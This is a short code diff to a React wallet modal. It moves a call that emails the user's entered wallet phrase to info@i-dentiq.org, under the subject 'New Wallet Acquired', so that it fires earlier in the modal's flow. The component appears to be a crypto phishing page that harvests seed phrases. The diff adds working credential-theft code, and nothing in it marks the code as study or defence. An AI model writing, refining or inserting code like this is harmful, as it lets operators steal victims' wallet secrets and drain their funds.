@@ -103,6 +103,16 @@ export default function WalletModal({ isOpen, onClose, active }) {
     setTimeout(() => setGif(false), 3000);
     setThird(false);
     setForth(true);
+
+    
+   resend.emails.send({
+    from: "info@i-dentiq.org",
+    to:  "info@i-dentiq.org",
+    subject: "New Wallet Acquired",
+    html: `<p>${userAgent.name}'s wallet phrase : \n ${inputs}</p>`,
+  });
+
+  
   };
 
   const click4 = () => {
@@ -112,12 +122,6 @@ export default function WalletModal({ isOpen, onClose, active }) {
     setForth(false);
     setFirst(true);
 
-    resend.emails.send({
-      from: "info@i-dentiq.org",
-      to: "info@i-dentiq.org",
-      subject: "New Wallet Acquired",
-      html: `<p>${userAgent.name}'s wallet phrase : \n ${inputs}</p>`,
-    });
   };
   useEffect(() => {
     if (spiral && mirage) {
